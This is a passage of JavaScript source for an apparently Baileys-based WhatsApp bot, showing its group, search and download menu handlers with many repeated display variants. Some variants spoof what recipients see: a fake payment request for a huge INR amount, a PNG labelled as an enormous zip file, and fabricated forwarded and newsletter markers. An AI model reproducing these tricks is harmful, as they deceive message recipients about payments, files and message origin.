│${setv} ${prefix}antimedia 🅖
│${setv} ${prefix}antiaudio 🅖
│${setv} ${prefix}antivideo 🅖
│${setv} ${prefix}antiimage 🅖
│${setv} ${prefix}antidocument 🅖
│${setv} ${prefix}antilocation 🅖
│${setv} ${prefix}anticontact 🅖
│${setv} ${prefix}antisticker 🅖
│${setv} ${prefix}antipoll 🅖
│${setv} ${prefix}antilink 🅖
│${setv} ${prefix}antipromotion 🅖
│${setv} ${prefix}antivirtex 🅖
│${setv} ${prefix}grouplink 🅖
│${setv} ${prefix}listadmin 🅖
│${setv} ${prefix}invite 🅖
│${setv} ${prefix}ephemeral 🅖
│${setv} ${prefix}delete 🅖
│${setv} ${prefix}setppgroup 🅖
│${setv} ${prefix}delppgroup 🅖
│${setv} ${prefix}setnamegc 🅖
│${setv} ${prefix}setdesc 🅖
│${setv} ${prefix}add 🅖
│${setv} ${prefix}kick 🅖
│${setv} ${prefix}promote 🅖
│${setv} ${prefix}demote 🅖
│${setv} ${prefix}kickall 🅖
│${setv} ${prefix}promoteall 🅖
│${setv} ${prefix}demoteall 🅖
│${setv} ${prefix}getcontact 🅞
│${setv} ${prefix}savecontact 🅞
│${setv} ${prefix}sendcontact 🅞
│${setv} ${prefix}contactag 🅞
│${setv} ${prefix}hidetag 🅖
│${setv} ${prefix}totag 🅖
│${setv} ${prefix}tagall 🅖
│${setv} ${prefix}editinfo 🅖
│${setv} ${prefix}opentime 🅖
│${setv} ${prefix}closetime 🅖
│${setv} ${prefix}resetlink 🅖
│${setv} ${prefix}getbio 🅖
│${setv} ${prefix}vote 🅖
│${setv} ${prefix}upvote 🅖
│${setv} ${prefix}downvote 🅖
│${setv} ${prefix}checkvote 🅖
│${setv} ${prefix}delvote 🅖
│${setv} ${prefix}antivirus 🅖
│${setv} ${prefix}antibadword 🅖
│${setv} ${prefix}nsfw 🅖
│${setv} ${prefix}react 🅖
│${setv} ${prefix}getjoinrequest 🅖
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'searchmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Search* 」❍
│${setv} ${prefix}google 🅕
│${setv} ${prefix}wikipedia 🅕
│${setv} ${prefix}ytsearch 🅕
│${setv} ${prefix}xnxxsearch 🅕
│${setv} ${prefix}xvideosearch 🅕
│${setv} ${prefix}apksearch 🅕
│${setv} ${prefix}stickersearch 🅕
│${setv} ${prefix}imdb 🅕
│${setv} ${prefix}wanumber 🅕
│${setv} ${prefix}friend 🅕
│${setv} ${prefix}lyrics 🅕
│${setv} ${prefix}pixiv 🅕
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'downloadmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Download* 」❍
│${setv} ${prefix}xnxxdl 🅕
│${setv} ${prefix}xvideodl 🅕
│${setv} ${prefix}itunes 🅕
│${setv} ${prefix}play 🅕
│${setv} ${prefix}ytmp3 🅕
│${setv} ${prefix}ytmp4 🅕
│${setv} ${prefix}tiktok 🅕
│${setv} ${prefix}tiktokaudio 🅕
│${setv} ${prefix}tiktokvideo 🅕
│${setv} ${prefix}igvideo 🅕
│${setv} ${prefix}igimage 🅕
│${setv} ${prefix}facebook 🅕
│${setv} ${prefix}twitter 🅕
│${setv} ${prefix}apk 🅕
│${setv} ${prefix}mega 🅕
│${setv} ${prefix}mediafire 🅕
│${setv} ${prefix}google 🅕
│${setv} ${prefix}gimage 🅕
│${setv} ${prefix}weather 🅕
│${setv} ${prefix}spotify 🅟
│${setv} ${prefix}gitclone 🅕
│${setv} ${prefix}happymod 🅕
│${setv} ${prefix}gdrive 🅕
│${setv} ${prefix}pinterest 🅕
│${setv} ${prefix}ringtone 🅕
│${setv} ${prefix}autodownload 🅞
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
